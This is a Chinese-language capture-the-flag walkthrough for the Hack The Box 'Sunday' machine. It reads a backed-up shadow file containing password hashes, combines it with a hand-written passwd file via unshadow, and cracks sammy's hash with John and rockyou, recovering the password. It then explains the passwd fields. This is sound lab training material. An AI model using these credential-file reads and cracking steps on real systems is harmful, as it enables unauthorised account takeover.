在backup目录下找打shadow的备份文件

`sunny@sunday:/backup$ ls agent22.backup shadow.backup sunny@sunday:/backup$ cat shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::`

写两个文件，passwd和shadow

`┌──(root kali)-[~/htb/Sunday] └─# cat passwd sammy:x:101:10:sammy:/export/home/sammy:/bin/bash ┌──(root kali)-[~/htb/Sunday] └─# cat shadow sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::`

用unshadow命令把上面两个文件合并成一个john可以识别的[哈希文件](https://zhida.zhihu.com/search?content_id=187354651&content_type=Article&match_order=1&q=%E5%93%88%E5%B8%8C%E6%96%87%E4%BB%B6&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NTcwMDY0MTUsInEiOiLlk4jluIzmlofku7YiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoxODczNTQ2NTEsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.8kiVlJPYG30StcDzz8FSfAsGBVGNEuCQMK2ow3zJlno&zhida_source=entity)

`┌──(root kali)-[~/htb/Sunday] └─# unshadow passwd shadow >pass.hash`

爆破这个hash文件

`┌──(root kali)-[~/htb/Sunday] └─# john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash Using default input encoding: UTF-8 Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status cooldude! (sammy) 1g 0:00:01:11 DONE (2021-12-16 21:35) 0.01393g/s 2839p/s 2839c/s 2839C/s domonique1..chrystelle Use the "--show" option to display all of the cracked passwords reliably Session completed`

现在我们得到了sammy的ssh密码：`cooldude!`

### `/etc/passwd` 字段解释

格式：

```Plain
用户名 : 密码占位符 : UID : GID : 用户描述 : 家目录 : 登录 shell

```

举例 `sammy:x:101:10:sammy:/export/home/sammy:/bin/bash`：

1. **用户名** → `sammy`
2. **密码占位符** → `x`（表示密码在 `/etc/shadow` 里保存，而不是这里）
3. **UID** → `101`（用户 ID，系统用的数字身份）
4. **GID** → `10`（用户的主组 ID）
5. **用户描述** → `sammy`（备注，可以是全名、描述等）
6. **家目录** → `/export/home/sammy`（用户登录后所在目录）
7. **Shell** → `/bin/bash`（用户登录时使用的 shell 程序）

你说的修改 `/etc/passwd` → 其实是你在 **攻击机 (Kali)** 里手动写的一个假的 `passwd` 文件，只是为了配合 `unshadow` 把 **用户名和 hash 对上号**，方便 John 来爆破。

⚠️ 这个文件 **不会影响目标靶机的权限**。

- 你写成 `/bin/bash` 也好，写成 `/bin/false` 也好，对靶机的 `sammy` 权限没有任何影响。
- 它只是在你的攻击机本地，John 用来识别“哪个 hash 属于哪个用户”。

---

### 🔹 在攻击机里写 passwd 的目的

- `unshadow` 必须要同时有一个 **passwd 文件**（提供用户名、UID、shell 信息）和 **shadow 文件**（提供 hash）。
- 它会拼接成标准格式给 John。
- 所以我们随便写一个“模拟的 passwd 行”，只要用户名对得上就行。

  

1. **[SecLists](https://github.com/danielmiessler/SecLists/tree/master)/**Usernames/Names/names.txt  
This have a name list